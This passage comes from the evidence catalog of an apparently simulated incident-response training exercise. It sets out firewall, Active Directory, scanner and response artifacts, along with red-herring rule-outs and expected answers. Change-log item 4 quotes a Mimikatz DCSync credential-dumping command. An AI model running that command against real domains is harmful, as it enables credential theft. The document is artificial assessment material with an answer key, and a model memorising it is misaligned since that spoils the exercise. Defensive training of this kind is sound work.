- **Purpose:** Red-herring context surface (internal metadata only) supporting the RH-05 rule-out. | **Relevance:** red-herring
- **Corroborates with:** E-DOC-002, E-FS-001 (contrast: different path, 2026 timestamp), E-WEB-003 (no 2026 requests to that path)
- **Red herring:** YES (RH-05 surface). Rule-out: 2025-11-08 timestamp + E-DOC-002 quarantine note + no 2026 IIS requests to that path in E-WEB-003.
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Not every web shell is this incident's shell; the live one is img.aspx.

---

## 6. Network / Firewall / Proxy Artifacts

### E-NET-001
- **Type:** FW-01 perimeter log excerpt | **Source system:** FW-01
- **Timestamp(s):** 2026-09-02 14:12 IST (scan); 14:31 IST (RDP banner grab)
- **Maps to:** EVT-001, EVT-002; also carries RH-07 ambient scanner noise
- **Candidate-visible fields:** TCP SYN probes from 45.155.90.23 across ports 1–10000 against 203.0.113.0/28; allow on 3389→203.0.113.10 (W-01 rule visible); banner-grab connection 14:31. Random low-rate 3389 probes from unrelated IPs (RH-07).
- **Purpose:** Recon + exposure confirmation. | **Relevance:** decisive (recon/exposure)
- **Corroborates with:** E-WEB-002 (same actor IP on web), E-AUTH-001 (follow-on brute force)
- **Red herring:** Contains RH-07 noise (rule out: distributed sources, zero successes, no follow-on).
- **Reveal phase:** 1 (investigation)
- **Expected significance:** The stale any→3389 rule (W-01) exists and was found by scanning on 09-02; 45.155.90.23 = attacker VPN exit.

### E-NET-002
- **Type:** FW-01 outbound log | **Source system:** FW-01
- **Timestamp(s):** 2026-09-03 13:25–13:31 IST
- **Maps to:** EVT-010
- **Candidate-visible fields:** 10.10.20.11 → 185.220.101.47:8443, ~18 MB transferred, HTTPS.
- **Purpose:** Exfiltration #1 (source code). | **Relevance:** decisive
- **Corroborates with:** E-EDR-002, E-FS-002, E-PROXY-001, E-NET-006
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** First exfil 09-03; note NetFlow gap (7-day retention): FW-01 connection logs survive; NetFlow copy expired (7-day retention, W-09) — see E-NET-006. The 09-03 flow is visible only here + EDR (W-09 lesson).

### E-NET-003
- **Type:** FW-01 outbound log (recurring connections) | **Source system:** FW-01
- **Timestamp(s):** First 2026-09-04 11:32 IST; every ~30 min thereafter through containment
- **Maps to:** EVT-018 (C2 operation)
- **Candidate-visible fields:** Periodic small outbound connections 10.10.20.21 → 185.220.101.47:8443 at ~30-min intervals.
- **Purpose:** Beacon pattern corroboration. | **Relevance:** decisive (C2)
- **Corroborates with:** E-EDR-008, E-FS-004, E-ALERT-001
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Active C2 from APP-PRD-01 — justifies immediate isolation and IOC block at FW-01.

### E-NET-004
- **Type:** FW-01 outbound log | **Source system:** FW-01
- **Timestamp(s):** 2026-09-05 12:30–13:05 IST
- **Maps to:** EVT-024
- **Candidate-visible fields:** 10.10.20.23 → 185.220.101.47:8443, ~680 MB, HTTPS POST pattern (chunked).
- **Purpose:** Exfiltration #2 (bulk data). | **Relevance:** decisive
- **Corroborates with:** E-EDR-012, E-FS-006
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** ~680 MB exfil confirmed; total exfil ~698 MB across both events.

### E-NET-005
- **Type:** FW-01 connection/session log | **Source system:** FW-01
- **Timestamp(s):** 2026-09-03 11:47–12:20 IST
- **Maps to:** EVT-005, EVT-006
- **Candidate-visible fields:** Sustained TCP 3389 session 45.155.90.23 → 203.0.113.10 established 11:47, duration matching the interactive window; preceded by repeated short 3389 connections 10:22–11:46 (brute-force cadence).
- **Purpose:** Network-side corroboration of initial access success and session duration (second independent source type for the decisive EVT-005/006 initial-access event). | **Relevance:** corroborating
- **Corroborates with:** E-AUTH-001, E-EDR-001
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Confirms successful RDP session (not just a logon event) from the attacker IP.

### E-NET-006
- **Type:** NetFlow retention summary report | **Source system:** NetFlow collector (report viewed during investigation)
- **Timestamp(s):** Summary as of 2026-09-09 (investigation); retained window = trailing 7 days only
- **Maps to:** EVT-010 / EVT-024 context (retention/W-09 teaching point)
- **Candidate-visible fields:** NetFlow retained 7 days only; as of 2026-09-09 the 09-03 exfil flow (10.10.20.11 → 185.220.101.47:8443) is absent from NetFlow and visible only in FW-01 logs + EDR.
- **Purpose:** Teaches retention limits; explains why the 09-03 exfil rests on FW-01 + EDR evidence (W-09 teaching point). | **Relevance:** corroborating
- **Corroborates with:** E-NET-002, E-NET-004, E-EDR-012
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Candidate understands evidence-survivability differences across log tiers; feeds recommendations (W-09 retention extension).

### E-PROXY-001
- **Type:** Proxy/egress gateway log (explicit negative record) | **Source system:** FW-01 egress path
- **Timestamp(s):** 2026-09-03 13:25–13:31 IST window
- **Maps to:** EVT-010
- **Candidate-visible fields:** Explicit summary line: no matching entries for 10.10.20.11 → 185.220.101.47:8443 in the 2026-09-03 13:25–13:31 window; server-VLAN egress is direct (no proxy enforcement).
- **Purpose:** Teaches negative evidence; explains why only FW/EDR saw the exfil. | **Relevance:** corroborating
- **Corroborates with:** E-NET-002, E-FS-002
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Egress-control gap → recommendations; exfil corroboration rests on FW + EDR.

---

## 7. Active Directory Artifacts

### E-AD-001
- **Type:** Windows Security 4720 (user created) | **Source system:** DC-01
- **Timestamp(s):** 2026-09-04 11:15 IST
- **Maps to:** EVT-017
- **Candidate-visible fields:** 4720: new user `svc_mon`, display "Monitoring Agent", description "Systems monitoring service"; creator account rajesh.kulkarni; source workstation APP-PRD-01.
- **Purpose:** Rogue account creation (persistence #1, T1136.001). | **Relevance:** decisive
- **Corroborates with:** E-AD-002, E-AD-003, E-AUTH-007
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** svc_mon is attacker-created identity persistence; created by compromised rajesh.kulkarni from APP-PRD-01.

### E-AD-002
- **Type:** Windows Security 4728/4732 (group additions) | **Source system:** DC-01 (+ local group events)
- **Timestamp(s):** 2026-09-04 11:16 IST
- **Maps to:** EVT-017
- **Candidate-visible fields:** svc_mon added to Domain Admins (4728) and to Remote Desktop Users on APP-PRD-01 and WEB-PRD-01 (4732).
- **Purpose:** Privilege grant to rogue account (T1098). | **Relevance:** decisive
- **Corroborates with:** E-AD-001, E-AD-003
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Full privilege scope of svc_mon; drives eradication (delete account + audit groups it touched).

### E-AD-003
- **Type:** AD object/group snapshot | **Source system:** DC-01 (directory export)
- **Timestamp(s):** Snapshot as of 2026-09-09 (investigation time); object creation date 2026-09-04 visible
- **Maps to:** EVT-017; also supports RH-04 rule-out
- **Candidate-visible fields:** Domain Admins membership list: svc_backup, admin_legacy, rajesh.kulkarni, svc_mon; svc_mon object creation timestamp 2026-09-04 11:15; snapshot includes `last_logon_ist` per object — admin_legacy last_logon_ist ≈2025-07 (14 months dormant, never used, weak password per registry).
- **Purpose:** Current-state confirmation of rogue privilege; red-herring context. | **Relevance:** decisive
- **Corroborates with:** E-AD-001, E-AD-002
- **Red herring:** Contains RH-04 surface (admin_legacy). Rule-out: `last_logon_ist` ≈2025-07 — no logons for 14 months; absent from every attack-path artifact.
- **Reveal phase:** 1 (investigation)
- **Expected significance:** svc_mon still present at detection → containment must disable it; admin_legacy is weak-but-unexploited (report as hygiene finding, not compromise).

### E-AD-004
- **Type:** Windows Security 4725/4726 (account disable/delete) | **Source system:** DC-01
- **Timestamp(s):** 2026-09-09 10:30 IST (disables, EVT-033); svc_mon deletion during eradication ~12:00–15:00 IST (EVT-035 step 4)
- **Maps to:** EVT-033, EVT-035
- **Candidate-visible fields:** 4725 disable events for svc_mon, rajesh.kulkarni, svc_portal at 10:30; later deletion of svc_mon.
- **Purpose:** Response execution record (identity containment). | **Relevance:** corroborating
- **Corroborates with:** E-RESP-001, E-RESP-003
- **Red herring:** No
- **Reveal phase:** 6 (response execution — entry stays in §7 per CHG-06)
- **Expected significance:** Confirms correct account-containment set executed.

---

## 8. Database / Share / Vulnerability Scanner / Context Artifacts

### E-DB-001
- **Type:** SQL Server audit log | **Source system:** DB-PRD-01 (VISTARA_SQL)
- **Timestamp(s):** 2026-09-05 15:20–15:41 IST
- **Maps to:** EVT-025
- **Candidate-visible fields:** Windows-auth login rajesh.kulkarni from 10.10.20.23; queries: `SELECT name FROM sys.databases;`, TOP 5 samples of `PortalDB.dbo.Customers`, `ERPDB.dbo.Vendors`; no bulk SELECT/export.
- **Purpose:** DB enumeration record. | **Relevance:** decisive (scoping judgment)
- **Corroborates with:** E-AUTH-008
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** DB-PRD-01 accessed read-only; not compromised; no bulk DB exfil — correct scoping excludes it from "compromised hosts" but notes data exposure risk of sampled rows.

### E-VULN-001
- **Type:** Vulnerability scanner job log | **Source system:** VULN-01 (10.10.40.13)
- **Timestamp(s):** 2026-09-04 09:15–11:02 IST (Friday)
- **Maps to:** EVT-007 / RH-01
- **Candidate-visible fields:** Authenticated scan job (credential svc_monitor), target list = Server VLAN; job_type = on_demand — manually initiated by operator devang.shah (pre-peak-season baseline re-scan); job ID `VS-MAN-2026-0904`. This is NOT the weekly scheduled job.
- **Purpose:** Red herring (scan noise overlapping attack window). | **Relevance:** red-herring
- **Corroborates with:** E-VULN-002 (same scanner/profile)
- **Red herring:** YES (RH-01). Rule-out (canonical): internal scanner source 10.10.40.13 (VULN-01, registered in asset inventory); authenticated scan using svc_monitor with a scanner job log; operator devang.shah; scan pattern is plugin-based host enumeration with no follow-on exploitation; no attacker behavior is ever sourced from 10.10.40.13.
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Distinguish sanctioned scanning from attacker recon. The 09-04 instance is an on-demand manual run — rule-out does NOT rest on the recurring schedule.

### E-VULN-002
- **Type:** Vulnerability scanner job log | **Source system:** VULN-01 (10.10.40.13)
- **Timestamp(s):** 2026-09-08 02:00–03:47 IST (Tuesday)
- **Maps to:** EVT-028 / RH-01
- **Candidate-visible fields:** Same authenticated scan profile as E-VULN-001 (credential svc_monitor); job_type = scheduled — recurring weekly job, Tuesdays 02:00 IST per ENVIRONMENT §8; job ID `VS-WK37-2026`; routine results.
- **Purpose:** Red herring recurrence. | **Relevance:** red-herring
- **Corroborates with:** E-VULN-001
- **Red herring:** YES (RH-01). Rule-out: scheduled recurring weekly job (Tuesdays 02:00 IST, job VS-WK37-2026) plus the canonical wording — internal scanner source 10.10.40.13 (VULN-01, registered in asset inventory); authenticated scan using svc_monitor with a scanner job log; operator devang.shah; plugin-based host enumeration with no follow-on exploitation; no attacker behavior is ever sourced from 10.10.40.13.
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Recurring benign pattern; not attacker activity.

### E-SHARE-001
- **Type:** SMB session + file-open audit | **Source system:** FILE-PRD-01
- **Timestamp(s):** 2026-09-05 10:20–11:45 IST
- **Maps to:** EVT-022
- **Candidate-visible fields:** SMB sessions from 10.10.20.21 as svc_mon; opens/reads across S:\Clients\, spec sheets, R:\HR\payroll_aug2026.xlsx, R:\Finance\.
- **Purpose:** Share-level collection record. | **Relevance:** corroborating
- **Corroborates with:** E-FS-005, E-EDR-010
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Confirms which shares/files were read — feeds data-scope determination.

### E-WIKI-001
- **Type:** Internal IT wiki page (service-account register) | **Source system:** IT wiki
- **Timestamp(s):** Page last updated 2024 (svc_portal entry); viewed during investigation
- **Maps to:** EVT-014 context; weakness W-03/W-03c documentation
- **Candidate-visible fields:** Register entry: `svc_portal` — password `Portal@2024`; note "service accounts exempt from rotation per AC-Policy-02"; reference from deploy.ps1 note.
- **Purpose:** Root-cause documentation of weak service-account credential. | **Relevance:** decisive (root cause)
- **Corroborates with:** E-FS-003, E-AUTH-001 (the password that worked)
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** The brute-forced password was documented internally — W-03/W-03c confirmed as root-cause enablers; feeds recommendations.

### E-DOC-001
- **Type:** Email artifact (2025 vendor correspondence) | **Source system:** MAIL-PRD-01 archive / IT mailbox export
- **Timestamp(s):** 2025 (vendor troubleshooting session era); surfaced during investigation
- **Maps to:** W-01 origin (background; no EVT)
- **Candidate-visible fields:** 2025 email thread: vendor troubleshooting; direct RDP enabled "for faster troubleshooting"; verbal approval by then-IT-head (departed 2025-12); no change ticket (CH-Policy-03 violation); conflicts with VP-Policy-05 (vendors must use VPN).
- **Purpose:** Explains origin of the exposed-RDP weakness. | **Relevance:** corroborating (root cause)
- **Corroborates with:** E-NET-001 (the rule exists and was used)
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** W-01 is a stale 2025 vendor rule — feeds eradication step 6 and recommendations (change-control enforcement).

### E-DOC-002
- **Type:** Prior IR report (2025 incident) | **Source system:** IT document store
- **Timestamp(s):** Report dated 2025; referenced file timestamp 2025-11-08
- **Maps to:** RH-05
- **Candidate-visible fields:** 2025 IR report noting quarantine (never deletion) of `C:\inetpub\wwwroot\assets\old\upload_bak.aspx`; file timestamp 2025-11-08; no 2026 execution records.
- **Purpose:** Red herring (old cleaned web shell). | **Relevance:** red-herring
- **Corroborates with:** E-FS-001 (contrast: different path, 2026 timestamp, live IIS hits in E-WEB-003), E-FS-007 (metadata surface)
- **Red herring:** YES (RH-05). Rule-out: 2025 timestamp; quarantine note in this report; no 2026 IIS requests to that path.
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Not every web shell is this incident's shell; the live one is img.aspx.

### E-DOC-003
- **Type:** HR travel-approval record (ticket TRV-2026-0312) | **Source system:** HR / ITSM document store
- **Timestamp(s):** Approved 2026-09-04; travel window 2026-09-07 → 2026-09-09
- **Maps to:** RH-03 rule-out; EVT-029 context
- **Candidate-visible fields:** Ticket TRV-2026-0312; traveler ananya.iyer; travel window 2026-09-07 → 2026-09-09; purpose: Ahmedabad client visit; approving manager Rohit Chavan.
- **Purpose:** Rule-out evidence for RH-03 (dossier-style context per SIMULATION_REQUIREMENTS §15.3 / §7 dossier rule; contains no attack facts). | **Relevance:** corroborating
- **Corroborates with:** E-AUTH-011, E-AUTH-012
- **Red herring:** No (it is rule-out evidence for RH-03)
- **Reveal phase:** 1 (investigation)
- **Expected significance:** ananya.iyer's 09-07 VPN/ERP activity is HR-approved business travel; exclude her from compromised accounts.

---

## 9. Response, Validation & Reporting Artifacts

### E-RESP-001
- **Type:** Containment execution record | **Source system:** EDR-CON-01 / FW-01 / FW-02 change log
- **Timestamp(s):** 2026-09-09 10:30 IST
- **Maps to:** EVT-033
- **Candidate-visible fields:** Network isolation of APP-PRD-01, FILE-PRD-01, WEB-PRD-01 (EDR isolation + FW-02); FW-01 egress block 185.220.101.47 (all ports); /staging/ site suspension on WEB-PRD-01; account disables cross-ref E-AD-004.
- **Purpose:** Confirms containment set executed. | **Relevance:** corroborating
- **Corroborates with:** E-AD-004, E-NET-003 (beacons stop)
- **Red herring:** No
- **Reveal phase:** 6 (response execution)
- **Expected significance:** Bleeding stopped; correct scope = 3 hosts, 3 accounts, 1 IOC.

### E-RESP-002
- **Type:** Evidence preservation record | **Source system:** IR toolchain
- **Timestamp(s):** 2026-09-09 11:00 IST
- **Maps to:** EVT-034
- **Candidate-visible fields:** Memory captures + disk snapshots of APP-PRD-01, FILE-PRD-01, WEB-PRD-01; SIEM export hash; chain-of-custody log.
- **Purpose:** Preservation before destructive eradication. | **Relevance:** corroborating
- **Corroborates with:** E-RESP-003 (eradication follows preservation)
- **Red herring:** No
- **Reveal phase:** 6 (response execution)
- **Expected significance:** Correct ordering: preserve → eradicate.

### E-RESP-003
- **Type:** Eradication checklist execution log | **Source system:** IR toolchain / DC-01 / FW-01 / WEB-PRD-01
- **Timestamp(s):** 2026-09-09 12:00–15:00 IST
- **Maps to:** EVT-035
- **Candidate-visible fields:** Ordered steps: (1) delete scheduled task on APP-PRD-01; (2) delete img.aspx on WEB-PRD-01; (3) delete staging.zip + passwords.txt (WEB-PRD-01), collect dir + order_export_2026.zip (FILE-PRD-01); (4) delete svc_mon + audit touched groups (E-AD-004); (5) resets: rajesh.kulkarni, svc_portal, all DA accounts, krbtgt ×2, org-wide user reset; (6) remove FW-01 3389 rule; (7) disable /staging/test/upload.aspx + restrict /staging/.
- **Purpose:** Eradication completeness record. | **Relevance:** corroborating
- **Corroborates with:** E-AD-004, E-FS-001/002/003/004/006 (targets), E-VALID-002 (verification)
- **Red herring:** No
- **Reveal phase:** 6 (response execution)
- **Expected significance:** All 3 persistence mechanisms + both entry weaknesses + stolen credentials addressed; "restore from backup alone" is insufficient.

### E-RESP-004
- **Type:** Recovery execution logs | **Source system:** BKP-01 (Veeam) / build system
- **Timestamp(s):** 2026-09-09 15:00–17:30 IST
- **Maps to:** EVT-036
- **Candidate-visible fields:** DC-01 validation (no persistence; krbtgt ×2 done); WEB-PRD-01 rebuild from clean template + portal redeploy + content restore from 09-02 backup after AV scan; APP-PRD-01 rebuild + domain rejoin + config from version control; FILE-PRD-01 data restore from 09-02 backup after malware scan + ACL verification.
- **Purpose:** Recovery sequence record. | **Relevance:** corroborating
- **Corroborates with:** E-VALID-001, E-VALID-002
- **Red herring:** No
- **Reveal phase:** 6 (response execution)
- **Expected significance:** Correct order DC → WEB → APP → FILE; backups pre-date 09-03 compromise (RPO 24h, one day file-version loss).

### E-VALID-001
- **Type:** Interim validation report | **Source system:** EDR-CON-01 / IR toolchain
- **Timestamp(s):** 2026-09-09 ~16:30 IST
- **Maps to:** EVT-036 (validation component)
- **Candidate-visible fields:** EDR full-scan clean on rebuilt/restored hosts; restore integrity checks pass.
- **Purpose:** Recovery validation input. | **Relevance:** corroborating
- **Corroborates with:** E-RESP-004, E-VALID-002
- **Red herring:** No
- **Reveal phase:** 6 (response execution)
- **Expected significance:** EDR-clean is necessary but NOT sufficient — leads into the validation trap.

### E-VALID-002
- **Type:** Safe-state validation report | **Source system:** IR toolchain / EDR-CON-01 / FW-01
- **Timestamp(s):** 2026-09-09 17:30 IST
- **Maps to:** EVT-037
- **Candidate-visible fields:** 7-check result set: (1) EDR clean all touched hosts; (2) persistence re-check — **packet initially shows this skipped on rebuilt APP-PRD-01** ("rebuilt, considered clean") (TRAP); (3) credential resets verified incl. krbtgt ×2 + org-wide; (4) no 185.220.101.47 egress in 72h monitoring; FW-01 3389 rule absent; upload page 404; (5) external rescan shows 3389 closed on 203.0.113.10; (6) no anomalous 4624 Type 10 / encoded-PS beacons; (7) business validation (portal order flow, shares, payroll app verified untouched).
- **Purpose:** Safe-state gate (incl. the designed trap). | **Relevance:** decisive (Phase 7)
- **Corroborates with:** E-VALID-001, E-RESP-003, E-AD-003 (svc_mon absence re-verified in AD)
- **Red herring:** No — but contains the insufficiency trap: declaring safe state on EDR-clean alone is a critical failure; persistence re-check on rebuilt hosts + AD audit must be explicitly completed first.
- **Reveal phase:** 7 (validation/reporting)
- **Expected significance:** Candidate insists on complete checklist before go; residual-risk statement selected (stolen data unrecoverable; W-05/W-06/W-08/W-09 open).

### E-REPORT-001
- **Type:** Final incident report (candidate deliverable template + canonical completed version) | **Source system:** Simulation reporting module
- **Timestamp(s):** 2026-09-10 10:00 IST
- **Maps to:** EVT-038
- **Candidate-visible fields:** Structured fields: summary, detection source (EDR-20260909-0417), attack path, timeline, affected assets/accounts/data, IOCs, ATT&CK map, containment/eradication/recovery actions, validation results, residual risk, recommendations.
- **Purpose:** Final deliverable; cross-checked against phase answers. | **Relevance:** decisive (Phase 7 scoring)
- **Corroborates with:** all of the above
- **Red herring:** No
- **Reveal phase:** 7 (validation/reporting)
- **Expected significance:** Internally consistent report: Sev-1, dwell 6 days, exfil ~698 MB, root cause W-01+W-03, escalation W-04.

---

## v1.1 change log (replaces v1.0 "Gaps flagged" — all gaps now resolved or by design)

1. **Scanner timing inconsistency (E-VULN-001/E-VULN-002)** → resolved (CHG-01): the 2026-09-04 09:15 instance is an authenticated ON-DEMAND scan manually initiated by devang.shah (job VS-MAN-2026-0904); the recurring weekly instance is 2026-09-08 02:00 IST (Tuesday, job VS-WK37-2026). RH-01 rule-out uses the canonical wording with no "Tuesday schedule" leg for the 09-04 instance.
2. **RH-03 travel-approval artifact** → resolved (CHG-03, CHG-07): E-DOC-003 (HR travel-approval record TRV-2026-0312) added; E-AUTH-011 now corroborates E-AUTH-012 + E-DOC-003 with the updated rule-out wording.
3. **WSUS-01 maintenance-churn red herring (2026-09-05 03:00)** → removed (CHG-08): it lacked resolvable candidate-visible evidence; that herring ID is retired and not reused. WSUS-01 remains in the host inventory as benign and unremarkable — only the red-herring framing is removed.
4. **EVT-020 (krbtgt capture) single-source** → by design: E-EDR-009 command line explicitly shows `lsadump::dcsync /domain:vistara.local /all`; krbtgt inclusion is deterministically inferable from the /all scope. No addition made.
5. **IIS UTC header text** → standardized (CHG-10): the exact canonical header string is mandated for every IIS artifact (see §2 header note).
6. **Event-ID realism in E-AUTH-001** → resolved (CHG-04): the initial-access success renders as 4624 LogonType 10 plus DC-01 4776 NTLM credential-validation records; the atypical ID flagged in v1.0 was removed everywhere.
7. **E-NET-005/E-NET-006 ID collision** → resolved (CHG-02): E-NET-005 remains the FW-01 RDP session log; the NetFlow 7-day-retention summary is the new E-NET-006, referenced from E-NET-002.
8. **Orphan artifacts registered** (CHG-03): E-FS-007, E-AUTH-012, E-EDR-015, E-PROXY-001, E-EDR-008B, and E-DOC-003 are now full first-class entries; the "— ADDED-BY-AGENT3" labels were dropped (CHG-11) and E-PROXY-001 corroboration fixed to E-NET-002 + E-FS-002.
9. **Other catalog-facing changes:** Reveal phase added to every entry (CHG-06); internal-authoring-document header note added (CHG-05); E-AD-003 snapshot now makes `last_logon_ist` explicit per object (admin_legacy ≈2025-07) as the RH-04 rule-out surface (CHG-11). CHG-09 (noise-budget recount) and CHG-12 (matrix structural updates) apply to the matrix document; CHG-08/CHG-10/CHG-11 dirspec and schemas portions apply to those documents — no further catalog impact.
